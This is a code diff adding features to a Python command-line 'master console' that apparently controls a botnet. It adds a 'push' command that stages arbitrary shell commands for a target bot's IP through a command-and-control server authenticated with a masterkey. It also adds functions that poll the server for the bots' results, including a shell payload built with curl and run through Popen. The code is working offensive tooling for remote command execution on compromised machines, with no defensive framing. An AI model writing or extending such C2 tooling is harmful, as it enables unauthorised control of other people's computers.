@@ -5,13 +5,45 @@ import requests
 import socket 
 import os 
 import platform 
+import asyncio
+import threading 
+from multiprocessing.pool import ThreadPool
+import time
+from subprocess import Popen, PIPE
 
 import cmd2
 from cmd2 import ansi
 
 REGISTERKEY = "registerkey"
 MASTERKEY = "masterkey"
+TIMER = '10'
 #URL = 'http://localhost:5000'
+
+
+async def get_result(bot_ip):
+    url = URL + '/bot/' + bot_ip + '/result'
+    masterkey = MASTERKEY 
+
+    data = {'masterkey': masterkey}
+    print("Sleeping...")
+    await asyncio.sleep(5)
+    res = requests.post(url, data=data) 
+
+    print(res.text) 
+
+
+"""
+def get_result(bot_ip):
+    url = URL + '/bot/' + bot_ip + '/result'
+    masterkey = MASTERKEY 
+
+    data = {'masterkey': masterkey}
+    time.sleep(5)
+    res = requests.post(url, data=data) 
+
+    return res.text 
+
+"""
 
 class CmdLineApp(cmd2.Cmd):
 
@@ -51,6 +83,7 @@ ___  ___          _              _____                       _
         # Should ANSI color output be allowed
         self.allow_ansi = ansi.ANSI_TERMINAL
 
+
     def get_ip():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
@@ -62,7 +95,8 @@ ___  ___          _              _____                       _
             s.close()
 
             return IP 
- 
+
+
     """
     speak_parser = argparse.ArgumentParser()
     speak_parser.add_argument('-p', '--piglatin', action='store_true', help='atinLay')
@@ -143,6 +177,33 @@ ___  ___          _              _____                       _
 
         self.poutput(output_botlist)
 
+
+
+    push_parser = argparse.ArgumentParser()
+    push_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to push the command")
+    push_parser.add_argument('-c', '--command', type=str, help='Command to push')
+
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_argparser(push_parser)
+    def do_push(self, args):
+        url = URL + '/bot/' + args.target + '/push'
+        masterkey = MASTERKEY
+        cmd = args.command 
+
+        data = {'masterkey': masterkey, 'cmd': cmd}
+
+        res = requests.post(url, data=data)
+
+        output_push = ansi.style("[+] Command staged for: " + args.target, fg='green', bold=True)
+        self.poutput(output_push)
+
+        # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
+        payload = "sleep " + TIMER + "; echo -e '\n[" + args.target + "] Result:\n=====================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
+        print("[*] payload = ", payload)
+        process = Popen(payload, shell=True)
+
+
+
     @cmd2.with_category(CUSTOM_CATEGORY)
     def do_exit(self, arg):
         self.poutput(ansi.style('\nExiting master console, bye.\n', fg='blue', bold=True))
@@ -152,14 +213,6 @@ ___  ___          _              _____                       _
     def do_quit(self, arg):
         self.poutput(ansi.style('\nExiting master console, bye.\n', fg='blue', bold=True))
         return True
-        
-
-    #TODO: Implement bot command push and returning the result 
-    #push_parser = argparse.ArgumentParser()
-    #push_parser.add_argument('-t', '--target', type=str, help='')
-
-
-
 
 
 if __name__ == '__main__':
